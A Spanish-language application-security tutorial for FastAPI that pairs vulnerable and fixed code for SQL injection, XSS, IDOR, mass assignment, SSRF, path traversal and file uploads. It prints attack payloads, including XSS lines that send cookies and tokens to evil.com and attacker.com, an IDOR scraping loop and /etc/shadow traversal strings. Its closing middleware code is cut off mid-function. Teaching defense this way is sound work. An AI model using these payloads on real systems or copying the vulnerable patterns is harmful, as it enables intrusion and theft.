SQL Injection

El input del usuario se concatena directamente en una query SQL. El atacante cierra la string e inyecta SQL propio. Con SQLAlchemy ORM estás protegido por defecto — el peligro está en text() con f-strings.

Payload del atacante en ?q= ' OR '1'='1
'; DROP TABLE users; --
' UNION SELECT email,password,3 FROM users--
admin'--

La segunda línea borra toda la tabla users. La tercera extrae emails y passwords. Con SQLMap esto se automatiza en segundos si el endpoint es vulnerable.

✓ Defensa: ORM parameterizado siempre. Si necesitas text(), usa bindparams. Pydantic valida tipos antes de que lleguen a la query.
❌ VULNERABLE — SQL Injection # NUNCA hacer esto @router.get("/search") async def search_users(q: str, db=Depends(get_db)): raw = f"SELECT * FROM users WHERE name='{q}'" result = await db.execute(text(raw)) return result.fetchall() # Input: q = "' OR '1'='1" # Query real: SELECT * FROM users WHERE name='' OR '1'='1' # → devuelve TODOS los usuarios sin autenticación
✓ SEGURO — ORM parameterizado # SQLAlchemy ORM — siempre seguro @router.get("/search") async def search_users( q: str = Query(max_length=100, pattern=r"^[a-zA-Z0-9 _-]+$"), db=Depends(get_db), _=Depends(get_current_user), # auth requerida ): result = await db.execute( select(User).where(User.name.ilike(f"%{q}%")) ) # SQLAlchemy escapa automáticamente return result.scalars().all()

Cross-Site Scripting

Tu API almacena o refleja HTML/JavaScript del usuario sin escapar. Cuando otro usuario ve ese contenido, el script malicioso corre en su navegador con acceso a sus cookies, tokens y cámara.

Payloads XSS clásicos <script>fetch('https://evil.com?c='+document.cookie)</script>
<img src=x onerror="document.location='//attacker.com?t='+localStorage.getItem('token')">
<svg/onload=alert(document.domain)>
javascript:eval(atob('...base64 malicioso...'))

El robo de tokens vía XSS es la forma más común de account takeover. Con el access_token del usuario, el atacante se autentica como esa persona indefinidamente.

✓ Defensa: API JSON nunca renderiza HTML. Content-Security-Policy header. X-Content-Type-Options: nosniff. Sanitizar con bleach si aceptas HTML.
❌ VULNERABLE — reflejo sin escapar # Un endpoint que devuelve HTML dinámico @router.get("/profile/{name}") async def profile_page(name: str): return HTMLResponse( f"<h1>Perfil de {name}</h1>" ) # name = "<script>...</script>" → ejecuta # Si tu API guarda y sirve contenido del usuario: bio = user_input # sin sanitizar return {"bio": bio} # el frontend lo renderiza: XSS stored
✓ SEGURO — JSON + sanitización # pip install bleach import bleach ALLOWED_TAGS = ["b", "i", "em", "strong"] class UserUpdate(BaseModel): bio: str = Field(max_length=500) @field_validator("bio") @classmethod def sanitize_bio(cls, v: str) -> str: # bleach elimina tags no permitidas y atributos return bleach.clean(v, tags=ALLOWED_TAGS, strip=True) # Headers que previenen XSS en el navegador: # Content-Security-Policy: default-src 'self' # X-Content-Type-Options: nosniff

IDOR — Insecure Direct Object Reference

El endpoint recibe un ID directamente del usuario y lo usa sin verificar que ese usuario tiene derecho a ese objeto. El atacante itera IDs secuenciales y extrae datos de todos.

Ataque IDOR — script bash for i in $(seq 1 10000); do
  curl -H "Auth: Bearer $MY_TOKEN" \
    /api/v1/orders/$i >> dump.json
done
# extrae 10,000 órdenes de otros usuarios

IDOR es la vulnerabilidad más reportada en bug bounty. Es fácil de explotar, devastadora para la privacidad, y muy fácil de prevenir con un check de propiedad.

✓ Defensa: verify_ownership() en cada endpoint. Usar UUIDs en lugar de IDs secuenciales. Test explícito de IDOR en pytest (Cap.04).
❌ VULNERABLE — sin verificación @router.get("/orders/{order_id}") async def get_order(order_id: int, db=Depends(get_db)): order = await db.get(Order, order_id) if not order: raise HTTPException(404) return order # cualquier usuario ve cualquier orden
✓ SEGURO — ownership verificado # app/services/base.py — patrón reutilizable async def verify_ownership( resource, current_user, allow_admin=True ): if not resource: raise HTTPException(404) is_owner = resource.user_id == current_user.id is_admin = allow_admin and current_user.is_admin if not (is_owner or is_admin): raise HTTPException(403, "Acceso denegado") return resource @router.get("/orders/{order_id}") async def get_order( order_id: int, current_user=Depends(get_current_user), db=Depends(get_db), ): order = await db.get(Order, order_id) return await verify_ownership(order, current_user)

Mass Assignment

El usuario envía campos extra en el JSON body que no deberían ser modificables — como is_admin: true, role: "superuser", o credits: 999999. Si el ORM acepta todo el dict sin filtrar, el atacante escala privilegios instantáneamente.

Body del atacante al registrar {"username": "hacker", "email": "h@x.com",
 "password": "pass", "is_admin": true,
 "credits": 99999, "role": "superuser"}

Pydantic previene esto si defines schemas estrictos. El error es usar el modelo ORM directamente como schema de entrada.

✓ Defensa: schemas separados para input (UserCreate) y output (UserResponse). Nunca aceptar el modelo ORM completo como input. model_fields_set en PATCH.
❌ VULNERABLE — sin schema @router.post("/users") async def create_user(body: dict, db=Depends(get_db)): user = User(**body) # acepta cualquier campo del body db.add(user) # is_admin=True se guarda return user # También peligroso — devolver el ORM completo: return user.__dict__ # incluye hashed_password!
✓ SEGURO — schemas estrictos # Input: solo los campos que el usuario puede enviar class UserCreate(BaseModel): email: EmailStr username: str = Field(min_length=3, max_length=50) password: str = Field(min_length=8) # is_admin NO está aquí → no puede enviarlo # Output: solo lo que el cliente necesita ver class UserResponse(BaseModel): id: int; email: str; username: str # hashed_password, is_admin NO están aquí model_config = {"from_attributes": True} # PATCH seguro — solo actualiza campos enviados @router.patch("/users/me", response_model=UserResponse) async def update_me(body: UserUpdate, ...): data = body.model_dump(exclude_unset=True) for k, v in data.items(): setattr(user, k, v)

Server-Side Request Forgery

Tu servidor hace requests HTTP a URLs que controla el atacante. En un entorno cloud (AWS, GCP, Azure), la URL http://169.254.169.254/latest/meta-data/ devuelve credenciales IAM del servidor. Con esas credenciales, el atacante tiene acceso completo a tu infraestructura.

URLs que el atacante podría inyectar http://169.254.169.254/latest/meta-data/iam/ ← AWS metadata
http://metadata.google.internal/computeMetadata/v1/
http://localhost:5432/ ← tu PostgreSQL interno
http://redis:6379/ ← tu Redis interno
file:///etc/passwd ← archivos del sistema

SSRF convierte tu servidor en un proxy para atacar servicios internos que de otro modo serían inaccesibles desde internet.

✓ Defensa: allowlist de dominios permitidos. Nunca hacer requests a URLs proporcionadas por el usuario sin validación estricta. Bloquear IPs privadas y localhost.
❌ VULNERABLE — URL sin validar @router.post("/fetch-preview") async def fetch_url_preview(url: str): async with httpx.AsyncClient() as client: resp = await client.get(url) # ← SSRF total return {"content": resp.text} # url = "http://169.254.169.254/latest/meta-data/" # → devuelve credenciales AWS del servidor
✓ SEGURO — validación estricta import ipaddress from urllib.parse import urlparse ALLOWED_DOMAINS = {"example.com", "api.trusted.com"} def validate_url_safe(url: str) -> str: parsed = urlparse(url) if parsed.scheme not in ("http", "https"): raise ValueError("Solo HTTP/HTTPS") if parsed.hostname not in ALLOWED_DOMAINS: raise ValueError("Dominio no permitido") # Bloquear IPs privadas try: ip = ipaddress.ip_address(parsed.hostname) if ip.is_private or ip.is_loopback: raise ValueError("IP privada bloqueada") except ValueError: pass return url

Path Traversal

El atacante usa ../ en nombres de archivo para navegar fuera del directorio permitido y leer archivos del sistema operativo como /etc/passwd, /etc/shadow, o tus propios archivos de configuración con secrets.

Payloads de Path Traversal GET /api/v1/files/download?name=../../../etc/passwd
GET /api/v1/files/../../../app/core/config.py
name=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fshadow
name=....//....//etc/passwd (bypass de filtros simples)

Particularmente peligroso en endpoints de descarga de archivos. Si tienes un sistema de avatares o documentos, este es el primer vector a cerrar.

✓ Defensa: pathlib.Path.resolve() + verificar que el path final está dentro del directorio base. Nunca confiar en nombres de archivo del usuario.
❌ VULNERABLE — path directo @router.get("/files/download") async def download_file(filename: str): path = f"/uploads/{filename}" return FileResponse(path) # filename = "../../../etc/passwd" # path = "/uploads/../../../etc/passwd" = "/etc/passwd"
✓ SEGURO — path confinado from pathlib import Path UPLOAD_DIR = Path("/app/uploads").resolve() def safe_path(filename: str) -> Path: # resolve() normaliza ../.. y symlinks candidate = (UPLOAD_DIR / filename).resolve() # Verificar que sigue dentro del directorio permitido if not str(candidate).startswith(str(UPLOAD_DIR)): raise HTTPException(400, "Ruta no permitida") if not candidate.exists(): raise HTTPException(404) return candidate @router.get("/files/download") async def download_file(filename: str): return FileResponse(safe_path(filename))

// sección 04 — subida de archivos

File Upload:
el vector más subestimado

Un endpoint de subida de archivos mal implementado puede comprometer todo el servidor. Cada paso del proceso tiene su propio vector de ataque.

01
Extensión
Verificar la extensión del archivo. Pero la extensión es solo cosmética — un ejecutable puede llamarse malware.jpg. La extensión es necesaria pero no suficiente como única defensa.
Solo primer filtro
02
MIME type
El header Content-Type del request es enviado por el cliente — el atacante puede poner image/jpeg en un ejecutable. Verificar con python-magic lee los primeros bytes reales del archivo (magic bytes) y detecta el tipo real.
Verificar magic bytes
03
Tamaño
Sin límite de tamaño, el atacante puede subir archivos de varios GB para consumir tu disco y memoria — DoS por agotamiento de recursos. Limitar en FastAPI con UploadFile y en Nginx antes de llegar a la app.
Límite estricto
04
Nombre
El nombre original nunca debe usarse para guardar el archivo. ../../etc/cron.daily/backdoor.sh es un nombre de archivo válido. Siempre renombrar con un UUID generado internamente antes de guardar.
UUID siempre
05
Contenido
Para imágenes: reprocesar con Pillow — abrir y re-guardar elimina cualquier payload embebido en los metadatos EXIF o en el archivo en sí. Una imagen que pasa por Pillow.save() es limpia.
Re-procesar
06
Almacenamiento
Nunca guardar uploads en el mismo directorio que el código. Usar S3 / R2 / MinIO — separación completa. Los archivos no son ejecutables en S3. Generar URLs firmadas con expiración para acceso.
S3 / Object store
✓ Endpoint de upload seguro completo # pip install python-magic Pillow import magic, uuid from fastapi import UploadFile, File, HTTPException from PIL import Image from pathlib import Path import io UPLOAD_DIR = Path("/app/uploads") MAX_SIZE = 5 * 1024 * 1024 # 5MB ALLOWED_TYPES = {"image/jpeg", "image/png", "image/webp"} @router.post("/upload/avatar") @limiter.limit("10/hour") async def upload_avatar( file: UploadFile = File(...), current_user=Depends(get_current_user), ): # 1. Leer con límite de tamaño content = await file.read(MAX_SIZE + 1) if len(content) > MAX_SIZE: raise HTTPException(413, "Archivo demasiado grande (máx 5MB)") # 2. Verificar magic bytes reales (ignora Content-Type del cliente) real_type = magic.from_buffer(content, mime=True) if real_type not in ALLOWED_TYPES: raise HTTPException(422, f"Tipo no permitido: {real_type}") # 3. Re-procesar imagen (elimina payloads embebidos) try: img = Image.open(io.BytesIO(content)) img.verify() # detecta imágenes corruptas/maliciosas img = Image.open(io.BytesIO(content)) img = img.convert("RGB") # normaliza formato img.thumbnail((800, 800)) # limita dimensiones except Exception: raise HTTPException(422, "Imagen inválida o corrupta") # 4. Guardar con UUID (NUNCA el nombre original) safe_name = f"{uuid.uuid4()}.jpg" output = io.BytesIO() img.save(output, format="JPEG", quality=85, optimize=True) # → enviar a S3 o guardar en UPLOAD_DIR return {"filename": safe_name, "size": output.tell()}

// sección 05 — headers HTTP

Security Headers:
la capa invisible

Cada header es una instrucción al navegador sobre cómo comportarse con tu respuesta. Juntos forman una capa de defensa sin código adicional en el frontend.

Content-Security-Policy
default-src 'self'; script-src 'self' 'nonce-{nonce}'; style-src 'self' 'unsafe-inline'; img-src 'self' data: https:; font-src 'self'; connect-src 'self'; frame-ancestors 'none'
El más importante. Controla exactamente qué recursos puede cargar el navegador. Previene XSS al bloquear scripts no autorizados.
OBLIGATORIO
Strict-Transport-Security
max-age=31536000; includeSubDomains; preload
Fuerza HTTPS por 1 año incluso si el usuario escribe http://. Previene SSL stripping. preload lo incluye en la lista precargada de los navegadores.
OBLIGATORIO
X-Content-Type-Options
nosniff
Previene MIME type sniffing — el navegador no puede "adivinar" que un archivo de texto es en realidad JavaScript ejecutable.
OBLIGATORIO
X-Frame-Options
DENY
Previene clickjacking — tu página no puede ser embebida en un iframe de otro dominio para engañar a usuarios que crean estar en tu sitio.
OBLIGATORIO
Permissions-Policy
camera=(), microphone=(), geolocation=(), interest-cohort=()
Deshabilita APIs del navegador que tu app no necesita. Un XSS no puede acceder a la cámara si el header lo prohíbe.
IMPORTANTE
Referrer-Policy
strict-origin-when-cross-origin
Controla qué URL se envía en el header Referer. Evita que URLs con tokens o datos sensibles se filtren a sitios externos.
IMPORTANTE
Server
(vacío)
El header Server por defecto revela "uvicorn". Elimínalo — el atacante no debería saber qué tecnología usas ni la versión.
IMPORTANTE
Cross-Origin-Opener-Policy
same-origin
Aisla tu página en su propio contexto de navegación. Mitiga ataques Spectre y acceso cross-origin a tu window object.
RECOMENDADO
✓ Middleware completo — todos los headers en producción # app/middleware/security.py — versión completa from starlette.middleware.base import BaseHTTPMiddleware from starlette.requests import Request import secrets class SecurityHeadersMiddleware(BaseHTTPMiddleware): async def dispatch(self, request: Request, call_next): response = await call_next(request) nonce = secrets.token_urlsafe(16) h = response.headers h["Content-Security-Policy"] = ( f"default-src 'self'; script-src 'self' 'nonce-{nonce}'; " "style-src 'self'; img-src 'self' data: https:; " "font-src 'self'; connect-src 'self'; frame-ancestors 'none'" ) h["Strict-Transport-Security"] = "max-age=31536000; includeSubDomains; preload" h["X-Content-Type-Options"] = "nosniff" h["X-Frame-Options"] = "DENY" h["Referrer-Policy"] = "strict-origin-when-cross-origin" h["Permissions-Policy"] = "camera=(), microphone=(), geolocation=()" h["Cross-Origin-Opener-Policy"] = "same-origin" h["Cross-Origin-Resource-Policy"] = "same-origin" h["Server"] = "" # ocultar stack h["X-Powered-By"] = "" # ocultar stack return response # Verificar en: https://securityheaders.com # Objetivo: puntuación A o A+

// sección 07 — patrones

Patrones de
código seguro

Decisiones de diseño que previenen clases enteras de vulnerabilidades antes de que existan.

01
🔐
Deny by Default
Todo está bloqueado por defecto. Los endpoints requieren autenticación salvo que explícitamente se marquen como públicos. El router incluye auth en todos.
router = APIRouter(
  dependencies=[Depends(get_current_user)]
)
# Los endpoints heredan auth automáticamente
02
📋
Allowlist, no Denylist
Define lo que se permite, no lo que se bloquea. Los denylist siempre tienen gaps. Si defines "solo JPEG, PNG, WebP", cualquier otro tipo falla automáticamente.
ALLOWED = {"image/jpeg", "image/png"}
if mime_type not in ALLOWED:
  raise HTTPException(422)
03
🏷
Errores Genéricos
Los mensajes de error no revelan información interna. "Usuario no encontrado" vs "Credenciales inválidas" — el primero confirma que el usuario existe. Siempre usar el mensaje más genérico.
raise HTTPException(
  401,
  "Credenciales inválidas"
) # no "usuario no existe"
04
⏱
Constant-Time Compare
Las comparaciones de strings normales pueden filtrarse por tiempo — el atacante mide cuánto tardan. Para tokens y hashes usar hmac.compare_digest que siempre tarda lo mismo.
import hmac
safe = hmac.compare_digest(
  user_token, expected_token
) # timing-safe
05
📝
Log sin datos sensibles
Los logs son el objetivo número uno después de comprometer un sistema. Nunca loguear contraseñas, tokens, números de tarjeta o PII. Loguear eventos, no datos.
logger.info(f"Login exitoso user_id={uid}")
# NO: logger.info(f"Login: {email} {password}")
06
🎯
Principle of Least Privilege
El usuario de PostgreSQL de tu app solo tiene SELECT, INSERT, UPDATE, DELETE en las tablas que necesita. No tiene CREATE, DROP ni acceso a tablas de sistema.
GRANT SELECT, INSERT, UPDATE, DELETE
  ON users, orders TO cipher_user;
# NO: GRANT ALL ON *.* TO cipher_user

# app/middleware/appsec.py — capa completa de seguridad from starlette.middleware.base import BaseHTTPMiddleware from starlette.requests import Request from starlette.responses import Response from loguru import logger import time, secrets, re from app.core.config import settings class AppSecMiddleware(BaseHTTPMiddleware): """Middleware de seguridad completo — headers + logging + protección.""" # Patrones sospechosos en URLs SUSPICIOUS = [ re.compile(r"\.\./|\.\.\\|%2e%2e", re.IGNORECASE), # path traversal re.compile(r"union\s+select|drop\s+table", re.IGNORECASE), # SQL re.compile(r", re.IGNORECASE), # XSS ] async def dispatch(self, request: Request, call_next) -> Response: start = time.time() request_id = secrets.token_hex(8) # 1. Detectar patrones sospechosos en URL full_path = str(request.url) for pattern in self.SUSPICIOUS: if pattern.search(full_path): logger.warning( f"SUSPICIOUS_REQUEST id={request_id} " f"ip={request.client.host} path={request.url.path}" ) return Response("Bad Request", status_code=400) # 2. Validar Content-Type en POST/PUT/PATCH if request.method in ("POST", "PUT", "PATCH"): ct = request.headers.get("content-type", "") if "multipart" not in ct and "application/json" not in ct: if not request.url.path.endswith("health"): return Response("Unsupported Media Type", status_code=415) # 3. Procesar request response = await call_next(request) elapsed = round((time.time() - start) * 1000, 2) # 4. ENTRADA #006 — CAPÍTULO 06 COMPLETADO

AppSec no es una checklist — es un cambio de mentalidad. Antes escribía código pensando en que funcionara. Ahora escribo código pensando en cómo alguien intentaría romperlo. La diferencia entre un endpoint vulnerable y uno seguro a veces es una sola línea: pattern=r"^[a-zA-Z0-9_-]+$" en un Field de Pydantic, o if current_user.id != resource.user_id en un endpoint.

El descubrimiento más valioso: pillow tenía CVEs activos en mi pyproject.toml y no lo sabía. Ejecutar pip-audit por primera vez es siempre revelador. Esto entra al CI/CD — cada PR verifica que no hay vulnerabilidades conocidas en dependencias antes de mergear.
